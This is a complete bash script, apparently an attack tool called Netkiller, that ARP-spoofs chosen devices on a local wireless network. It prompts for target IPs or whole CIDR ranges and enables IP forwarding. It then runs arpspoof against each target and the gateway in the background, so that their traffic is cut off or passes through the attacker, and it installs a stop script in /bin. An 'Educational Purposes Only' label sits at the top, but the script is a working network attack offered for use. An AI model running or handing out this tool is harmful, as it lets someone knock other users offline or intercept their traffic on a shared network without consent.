#!/bin/bash -e

# Made by Xiv3r
# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: dsniff, arping, ipcalc, and root privileges

# Check if script is running as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root"
    echo "Please re-run using: sudo $0 $*"
    exit 1
fi

# Check for required tools
REQUIRED_TOOLS=("dsniff" "arping" "ipcalc")

for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo "$tool is required but not installed. Please install it."
        exit 1
    fi
done

# Detect Current Network Configuration
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
if [[ -z "$WLAN" ]]; then
    echo "No wireless interface found. Exiting."
    exit 1
fi

GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
if [[ -z "$GW" ]]; then
    echo "No default gateway found. Exiting."
    exit 1
fi

IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
if [[ -z "$IP" ]]; then
    echo "No IP address found on interface $WLAN. Exiting."
    exit 1
fi

echo ""
echo "Current Network Information"
echo "INTERFACE: | $WLAN"
echo "GATEWAY:   | $GW"
echo "DEVICE IP: | $IP"
echo ""

# Detect Interface
echo "Enter Wireless Interface: Enter for default"
read -rp "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"
echo ""

# Detect Gateway IP
echo "Enter Target Gateway: Enter for default"
read -rp "> $GW " INET
GATEWAY="${INET:-$GW}"
echo ""

# Detect Target IPs or CIDR
echo "Enter Target IP (e.g., 10.0.0.123 10.0.0.124 or 10.0.0.0/20)"
read -rp "> " IPS
# If no input, prompt again or exit
if [[ -z "$IPS" ]]; then
    echo "No target IPs or CIDR provided. Exiting."
    exit 1
fi
# Convert comma-separated to space-separated if needed
INPUT_IPS=$(echo "$IPS" | tr ',' ' ')
echo ""

# Detect Device IP
MYIP="$IP"

# Prompt configuration
echo "Target Network Configuration"
echo "INTERFACE: | $INTERFACE"
echo "GATEWAY:   | $GATEWAY"
echo "DEVICE IP: | $MYIP"
echo "TARGETS:   | $INPUT_IPS"
echo ""

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Create stop script
cat > /bin/netkiller-stop << 'EOF'
#!/bin/sh

echo ""
echo "Netkiller is stopped!"
ip -s -s neigh flush all > /dev/null 2>&1
pkill -f arping
pkill -f arpspoof
sleep 2s
echo "Restoring the users connections..."
echo ""
EOF
chmod 755 /bin/netkiller-stop

# Function to expand CIDR to individual IPs using ipcalc
expand_cidr() {
    local cidr=$1
    # Use ipcalc to get the range of IPs
    local ip_range
    ip_range=$(ipcalc "$cidr" | grep '^Host' | awk '{print $2}')
    if [[ -z "$ip_range" ]]; then
        echo "Invalid CIDR: $cidr. Skipping." >&2
        return 1
    fi
    # Extract start and end IPs
    local start_ip end_ip start end
    start_ip=$(echo "$ip_range" | cut -d'-' -f1)
    end_ip=$(echo "$ip_range" | cut -d'-' -f2)
    # Convert IPs to integers for iteration
    start=$(echo "$start_ip" | awk -F. '{print ($1*256^3)+($2*256^2)+($3*256)+$4}')
    end=$(echo "$end_ip" | awk -F. '{print ($1*256^3)+($2*256^2)+($3*256)+$4}')
    # Iterate through the range
    for ((i=start; i<=end; i++)); do
        # Convert integer back to IP
        echo "$(( (i>>24) & 255 )).$(( (i>>16) & 255 )).$(( (i>>8) & 255 )).$(( i & 255 ))"
    done
}

# Process each input (IP or CIDR)
TARGET_IPS=""
for INPUT in $INPUT_IPS; do
    # Check if input is a CIDR (contains '/')
    if [[ "$INPUT" == */* ]]; then
        # Expand CIDR to individual IPs
        IPS_EXPANDED=$(expand_cidr "$INPUT")
        if [[ -n "$IPS_EXPANDED" ]]; then
            # Filter out our own IP from the expanded list
            FILTERED_IPS=""
            for IP in $IPS_EXPANDED; do
                if [[ "$IP" != "$MYIP" ]]; then
                    FILTERED_IPS="$FILTERED_IPS $IP"
                fi
            done
            TARGET_IPS="$TARGET_IPS $FILTERED_IPS"
        fi
    else
        # Validate single IP format
        if [[ "$INPUT" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            TARGET_IPS="$TARGET_IPS $INPUT"
        else
            echo "Invalid IP address: $INPUT. Skipping."
        fi
    fi
done

# Remove duplicates and ensure TARGET_IPS is not empty
TARGET_IPS=$(echo "$TARGET_IPS" | tr ' ' '\n' | sort -u | tr '\n' ' ')
if [[ -z "$TARGET_IPS" ]]; then
    echo "No valid IPs or CIDR ranges provided (after filtering). Exiting."
    exit 1
fi

# Iterate over each target IP
for TARGET in $TARGET_IPS; do
    # Skip if the target is the gateway or device IP
    if [[ "$TARGET" == "$GATEWAY" ]] || [[ "$TARGET" == "$MYIP" ]]; then
        echo "Skipping $TARGET (matches gateway or device IP)."
        continue
    fi
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
      echo "Netkiller killing the target IP: $TARGET"
done

echo ""
echo "Netkiller attack is running in the background...!!!"
echo "To stop, run: sudo netkiller-stop"
echo " "
